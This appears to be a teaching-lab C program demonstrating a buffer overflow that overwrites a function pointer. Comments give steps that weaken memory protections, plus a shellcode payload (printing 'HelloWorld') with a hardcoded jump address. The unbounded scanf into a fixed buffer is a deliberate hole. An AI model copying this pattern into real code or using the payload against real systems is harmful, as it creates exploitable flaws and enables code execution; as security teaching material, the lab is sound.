/**

Preparation instructions: sudo su && echo 1 > /proc/sys/kernel/randomize_va_space 

Compile instructions: gcc heap_spray_user_input.c -fno-stack-protector -z execstack -m32 -no-pie -g -o heap_spray_user_input

Inspect instructions: objdump -d heap_spray_user_input

Run instructions: python -c "print('\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHelloWorld\r\n' + ('A' * 64 + '\x60\xb1\x04\x08'))" | ./heap_spray_user_input 

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int secure_method() {
    printf("I did something.\n");
    return 1;
}

int main(void) {
    // user_input would most likely be dynamically allocated at runtime, but we can statically do it right now to keep the program simple
    char* simulated_user_input = malloc(10000);

    scanf("%s", simulated_user_input);

    volatile int (*function_pointer)();
    char buffer[64];

    function_pointer = &secure_method;

    printf("Simulated user input\t 0x%08x\n", simulated_user_input);
    printf("Buffer for overflow\t 0x%08x\n", buffer);
    printf("Function pointer\t 0x%08x\n", function_pointer);

    // corrupt the function pointer
    scanf("%s", buffer);

    printf("Corrupted function pointer\t 0x%08x\n", function_pointer);

    // if function pointer exists, execute
    if (function_pointer)
    {
        printf("Calling func pointer\t 0x%08x\n", function_pointer);
        function_pointer();
    }
    return 0;
}
